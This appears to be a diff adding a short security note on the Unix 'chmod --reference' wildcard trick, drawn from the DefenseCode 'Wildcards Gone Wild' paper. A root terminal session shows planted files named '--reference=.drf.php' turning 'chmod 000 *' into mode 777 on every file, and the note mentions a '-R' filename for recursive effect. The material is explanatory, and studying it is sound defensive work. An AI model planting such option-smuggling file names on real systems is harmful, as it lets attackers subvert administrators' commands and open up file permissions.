@@ -1,0 +1,69 @@
+Chmod file reference trick
+=============================================
+
+
+https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+https://www.slideshare.net/FaresEmir/old-school-hacking-exploiting-unix-wildcards
+
+
+Another interesting attack vector similar to previously described 'chown' 
+attack is 'chmod'.
+Chmod also has --reference option that can be abused to specify arbitrary 
+permissions on files selected with asterisk wildcard.
+
+Chmod manual page (man chmod):
+       --reference=RFILE
+              use RFILE's mode instead of MODE values
+
+Example is presented below.
+
+[root@defensecode public]# ls -al
+total 68
+drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
+drwx------. 24 user user  4096 Oct 28 18:32 ..
+-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
+-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
+-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
+-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
+-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
+-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
+-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
+-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
+-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
+-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
+-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
+-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
+-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
+
+Superuser will now try to set mode 000 on all files.
+
+[root@defensecode public]# chmod 000 *
+
+Let's check permissions on files...
+
+[root@defensecode public]# ls -al
+total 68
+drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
+drwx------. 24 user user  4096 Oct 28 18:32 ..
+-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
+-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
+-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
+-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
+-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
+-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
+-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
+-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
+-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
+-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
+-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
+-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
+-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php
+
+What happened? Instead of 000, all files are now set to mode 777 because
+of the '--reference' option supplied through file name..
+Once again, file .drf.php owned by user 'leon' with mode 777 was 
+used as reference file and since --reference option is supplied, all files
+will be set to mode 777.
+Beside just --reference option, attacker can also create another file with 
+'-R' filename, to change file permissions on files in all subdirectories recursively.
